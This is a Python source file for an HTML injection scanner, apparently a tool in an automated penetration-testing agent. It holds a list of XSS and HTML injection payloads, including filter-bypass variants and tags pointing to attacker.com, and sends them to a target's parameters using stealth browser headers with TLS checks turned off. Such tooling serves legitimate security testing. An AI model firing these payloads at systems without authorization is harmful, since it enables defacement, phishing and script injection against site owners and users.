"""
HTML INJECTION SCANNER
======================
Test for HTML injection vulnerabilities.
Injects HTML tags into response contexts to detect stored/reflected HTML injection.

Usage:
    from tools.html_injection_scanner import html_injection_scanner
"""

import json
from core.tool_transport import guarded_requests as requests
import re
from urllib.parse import quote, urlparse
from core.tool_decorator import langchain_tool as tool
from core.rate_limiter import rate_limiter
from core.auth_store import auth_get, auth_post
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.stealth_engine import stealth

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# HTML Injection payloads (non-JS, visual impact)
HTML_PAYLOADS = [
    # Visual defacement
    ('<h1>HACKED</h1>', "h1", "Heading injection"),
    ('<b>BOLD</b>', "<b>", "Bold text injection"),
    ('<i>ITALIC</i>', "<i>", "Italic text injection"),
    ('<u>UNDERLINE</u>', "<u>", "Underline injection"),
    ('<marquee>SCROLL</marquee>', "<marquee>", "Marquee injection"),
    ('<blink>FLASH</blink>', "<blink>", "Blink injection"),

    # Image injection
    ('<img src="x" onerror="alert(1)">', "<img", "Image tag injection"),
    ('<img src="https://attacker.com/track.gif">', "attacker.com", "Image tracking pixel"),

    # Link injection
    ('<a href="https://attacker.com">Click Here</a>', "attacker.com", "Link injection"),
    ('<a href="javascript:alert(1)">Click</a>', "javascript:", "JavaScript link injection"),

    # Iframe injection
    ('<iframe src="https://attacker.com"></iframe>', "attacker.com", "Iframe injection"),
    ('<iframe src="javascript:alert(1)"></iframe>', "javascript:", "JavaScript iframe injection"),

    # Form injection
    ('<form action="https://attacker.com"><input type="submit" value="Click"></form>', "attacker.com", "Form injection"),

    # CSS injection
    ('<style>body{background:red}</style>', "background:red", "CSS injection"),
    ('<link rel="stylesheet" href="https://attacker.com/style.css">', "attacker.com", "External CSS injection"),

    # SVG injection
    ('<svg onload="alert(1)"></svg>', "<svg", "SVG injection"),

    # ── ENCODING BYPASS PAYLOADS ──────────────────────────────────────────────
    ('&#60;h1&#62;HACKED&#60;/h1&#62;', "&#60;", "HTML entity encoding"),
    ('&#x3C;h1&#x3E;HACKED&#x3C;/h1&#x3E;', "&#x3C;", "Hex entity encoding"),
    ('%3Ch1%3EHACKED%3C/h1%3E', "%3C", "URL encoding"),
    ('%26lt%3Bh1%26gt%3BHACKED%26lt%3B/h1%26gt%3B', "%26lt", "Double URL encoding"),

    # ── CASE VARIATION PAYLOADS ───────────────────────────────────────────────
    ('<H1>HACKED</H1>', "<H1>", "Uppercase tags"),
    ('<h1>HACKED</h1>', "<h1>", "Lowercase tags"),
    ('<Hi>hackED</Hi>', "<Hi>", "Mixed case tags"),

    # ── WHITESPACE BYPASS PAYLOADS ────────────────────────────────────────────
    ('< h1 >HACKED< /h1 >', "< h1 >", "Space in tags"),
    ('<h1\t>HACKED</h1>', "<h1\t", "Tab in tags"),
    ('<h1\n>HACKED</h1>', "<h1\n", "Newline in tags"),

    # ── NULL BYTE BYPASS PAYLOADS ─────────────────────────────────────────────
    ('<h1%00>HACKED</h1>', "<h1%00", "Null byte in tag"),

    # ── COMMENT BYPASS PAYLOADS ───────────────────────────────────────────────
    ('<!--><h1>HACKED</h1>-->', "<!-->", "Comment bypass"),
    ('<!----><h1>HACKED</h1>', "<!---->", "Empty comment bypass"),

    # ── DATA URI PAYLOADS ─────────────────────────────────────────────────────
    ('<a href="data:text/html,<h1>HACKED</h1>">Click</a>', "data:text/html", "Data URI injection"),
    ('<iframe src="data:text/html,<h1>HACKED</h1>">', "data:text/html", "Iframe data URI"),

    # ── EVENT HANDLER PAYLOADS ────────────────────────────────────────────────
    ('<h1 onmouseover="alert(1)">HACKED</h1>', "onmouseover", "Event handler injection"),
    ('<h1 onfocus="alert(1)">HACKED</h1>', "onfocus", "Focus event injection"),
    ('<h1 onclick="alert(1)">HACKED</h1>', "onclick", "Click event injection"),

    # ── TEMPLATE INJECTION PAYLOADS ───────────────────────────────────────────
    ('${7*7}', "49", "Template expression (Jinja2/Twig)"),
    ('{{7*7}}', "49", "Template expression (Generic)"),
    ('<%= 7*7 %>', "49", "ERB template injection"),
]


@tool("html_injection_scanner")
def html_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for HTML injection vulnerabilities.
    Tests injecting HTML tags into response contexts (stored/reflected).

    Args:
        url: Target URL
        params: Comma-separated parameter names to test
    """
    tool_name = "HTML Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting HTML injection scan on {url}")
    if check_cancelled(logger): return "CANCELLED: job cancelled by user."

    approved = require_approval(
        action=f"HTML injection scan on {url}",
        context=f"Inject HTML tags into {params or 'default'} parameters",
        risk="low",
        exec_logger=logger,
    )
    if not approved:
        return "CANCELLED: approval rejected or timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)

    param_list = [p.strip() for p in params.split(",")] if params else [
        "name", "comment", "bio", "description", "message",
        "title", "body", "content", "text", "note", "q", "search",
    ]

    vulnerabilities = []
    tested = 0

    # Capture baseline
    try:
        rate_limiter.wait(domain)
        baseline = auth_get(url, timeout=8, verify=False, **auth_kwargs)
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} params x {len(HTML_PAYLOADS)} payloads")

    # ── PHASE 1: GET parameter testing ────────────────────────────────────────
    for param in param_list:
        if check_cancelled(logger): break

        for payload, indicator, description in HTML_PAYLOADS:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(payload)}"

                stealth_headers = stealth.get_browser_headers(test_url)
                resp = auth_get(
                    test_url,
                    headers=stealth_headers,
                    timeout=5,
                    verify=False,
                    **auth_kwargs,
                )
                tested += 1

                # Check if HTML payload is reflected unescaped
                if payload in resp.text:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "HTML Injection (Reflected - GET)",
                        "description": description,
                        "severity": "Medium",
                        "evidence": f"HTML payload reflected in response body",
                        "status_code": resp.status_code,
                        "method": "GET",
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"HTML injection (GET): param={param}, type={description}")
                    break  # One confirmed per param is enough

            except Exception:
                continue

    # ── PHASE 2: POST body testing ────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing POST body injection")
    post_params = ["comment", "message", "body", "content", "text", "note", "bio", "description"]

    for param in post_params:
        if check_cancelled(logger): break

        # Skip if already found vulnerable via GET
        if any(v["parameter"] == param for v in vulnerabilities):
            continue

        for payload, indicator, description in HTML_PAYLOADS[:15]:  # Limit to top 15 for POST
            try:
                rate_limiter.wait(domain)
                stealth_headers = stealth.get_browser_headers(url)
                resp = auth_post(
                    url,
                    data={param: payload},
                    headers={**stealth_headers, "Content-Type": "application/x-www-form-urlencoded"},
                    timeout=5,
                    verify=False,
                    **auth_kwargs,
                )
                tested += 1

                # Check if HTML payload is reflected unescaped
                if payload in resp.text:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "HTML Injection (Reflected - POST)",
                        "description": description,
                        "severity": "Medium",
                        "evidence": f"HTML payload reflected in POST response body",
                        "status_code": resp.status_code,
                        "method": "POST",
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"HTML injection (POST): param={param}, type={description}")
                    break

            except Exception:
                continue

        # Also test JSON body
        try:
            rate_limiter.wait(domain)
            stealth_headers = stealth.get_browser_headers(url)
            resp = auth_post(
                url,
                json={param: HTML_PAYLOADS[0][0]},  # First payload
                headers={**stealth_headers, "Content-Type": "application/json"},
                timeout=5,
                verify=False,
                **auth_kwargs,
            )
            tested += 1

            if HTML_PAYLOADS[0][0] in resp.text:
                vulnerabilities.append({
                    "parameter": param,
                    "payload": HTML_PAYLOADS[0][0],
                    "type": "HTML Injection (JSON Body)",
                    "description": "JSON body injection",
                    "severity": "Medium",
                    "evidence": f"HTML payload reflected in JSON response",
                    "status_code": resp.status_code,
                    "method": "POST (JSON)",
                })
        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "total_tested": tested,
        "params_tested": param_list,
    }

    logger.add_log(tool_name, "SUCCESS",
        f"HTML injection scan complete. {tested} tests, {len(vulnerabilities)} findings")
    return json.dumps(result, indent=2)
